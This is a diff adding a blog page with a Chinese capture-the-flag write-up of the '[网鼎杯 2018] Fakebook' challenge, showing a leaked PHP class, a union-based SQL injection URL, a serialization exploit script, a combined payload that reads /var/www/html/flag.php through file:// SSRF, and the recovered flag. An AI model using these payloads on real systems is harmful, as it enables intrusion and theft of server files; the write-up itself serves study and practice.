@@ -1,0 +1,264 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一道有趣的sql注入+php反序列化 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一道有趣的sql注入+php反序列化 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="[网鼎杯 2018]Fakebook
+题目并不难,但是将反序列化和sql注入结合起来,之前做过的大多数是单只考虑某个类型
+首先扫描目录会发现一个备份文件泄露
+user.php.bak
+&lt;?php
+
+
+class UserInfo
+{
+..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一道有趣的sql注入+php反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-01-04
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</h1>
+<p>题目并不难,但是将反序列化和sql注入结合起来,之前做过的大多数是单只考虑某个类型</p>
+<p>首先扫描目录会发现一个备份文件泄露<br>
+user.php.bak</p>
+<pre><code class="language-php">&lt;?php
+
+
+class UserInfo
+{
+    public $name = &quot;&quot;;
+    public $age = 0;
+    public $blog = &quot;&quot;;
+
+    public function __construct($name, $age, $blog)
+    {
+        $this-&gt;name = $name;
+        $this-&gt;age = (int)$age;
+        $this-&gt;blog = $blog;
+    }
+
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+
+    public function getBlogContents ()
+    {
+        return $this-&gt;get($this-&gt;blog);
+    }
+
+    public function isValidBlog ()
+    {
+        $blog = $this-&gt;blog;
+        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+    }
+
+}
+</code></pre>
+<p>基本上可以猜测到可能有反序列化漏洞</p>
+<p><strong>注:</strong> 其实这个网站用于获取某用户博客网站的网页内容,且使用curl来获取,这可能造成ssrf</p>
+<p>在join界面随便注册一个账号<br>
+<img src="https://NaCl1.github.io/post-images/1704382946375.png" alt="" loading="lazy"><br>
+之后登录到这个页面<br>
+<img src="https://NaCl1.github.io/post-images/1704383015757.png" alt="" loading="lazy"><br>
+很容易发现这里存在一个sql注入点:</p>
+<pre><code class="language-url">http://node4.anna.nssctf.cn:28197/view.php?no=1
+</code></pre>
+<p>稍微测试一下就可以注入</p>
+<p>http://node4.anna.nssctf.cn:28197/view.php?no=-1/<strong>/union/</strong>/select/<strong>/1,2,3,4/</strong>/from/**/fakebook.users#<br>
+<img src="https://NaCl1.github.io/post-images/1704383497523.png" alt="" loading="lazy"><br>
+这里的报错就很重要了<br>
+这说明3,4两个位置是要传入一个对象的序列化内容,之后程序会对其进行反序列化<br>
+如此一来,就造成了反序列化漏洞<br>
+exp:</p>
+<pre><code class="language-php">&lt;?php
+class UserInfo
+{
+    public $name = &quot;nacl&quot;;
+    public $age = 0;
+    public $blog = &quot;file:///var/www/html/flag.php&quot;;
+
+}
+$nacl = new UserInfo();
+echo serialize($nacl);
+</code></pre>
+<p>这里ssrf获取flag.php的内容<br>
+payload:</p>
+<pre><code>http://node4.anna.nssctf.cn:28197/view.php?no=-1/**/union/**/select/**/1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;nacl&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}'#
+</code></pre>
+<p>注意引号包裹序列内容<br>
+查看网页源代码就可以看见curl下来的内容,(需要点进去或者base64解码)</p>
+<pre><code class="language-php">&lt;?php
+$flag = &quot;NSSCTF{efcfe0cc-79d1-4154-b2b9-19543f7f1132}&quot;;
+exit(0);
+</code></pre>
+<p>总结:<br>
+这题关键在于仔细观擦每一个报错,这是必要的</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018fakebook">[网鼎杯 2018]Fakebook</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/20231209-xiao-ji/">
+              <h3 class="post-title">
+                2023/12/09 小记
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
